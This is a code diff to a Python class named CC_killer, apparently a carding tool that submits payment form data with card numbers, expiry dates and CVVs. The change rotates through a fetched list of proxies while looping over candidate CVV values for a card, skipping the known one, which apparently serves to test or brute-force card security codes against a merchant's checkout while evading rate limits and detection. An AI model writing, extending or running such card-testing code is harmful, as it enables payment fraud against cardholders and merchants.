@@ -184,7 +184,7 @@ class CC_killer():
         elif card_num.startswith(('51', '52', '53', '54', '55')) or (2221 <= int(card_num[:4]) <= 2720):
             return "MasterCard"
         
-    def run_cvv(self, card_num, month, year, cvv):
+    def run_cvv(self, card_num, month, year, cvv, ip, port):
         
         form_data['CardType'] = self.check_card_type(str(card_num))
         
@@ -203,8 +203,6 @@ class CC_killer():
         
         form_data['bemail'] = email
         form_data['bconfirmemail'] = email
-        
-        ip, port = self.proxy.get_random_proxy()
         
         proxy_header = {
             'http': f"http://{ip}:{port}",
@@ -237,10 +235,12 @@ class CC_killer():
             
             print(msg)
             
-            for fake_cvv in cvv_list:
+            proxies = self.proxy.fetch_proxies()
+            
+            for idx, fake_cvv in enumerate(cvv_list):
                 if str(cvv) == str(fake_cvv):
                     continue
-                self.run_cvv(card_num, month, year, fake_cvv)
+                self.run_cvv(card_num, month, year, fake_cvv, proxies[idx % len(proxies)]['ip'], proxies[idx % len(proxies)]['port'])
                 
         except Exception as err:
             print(err)
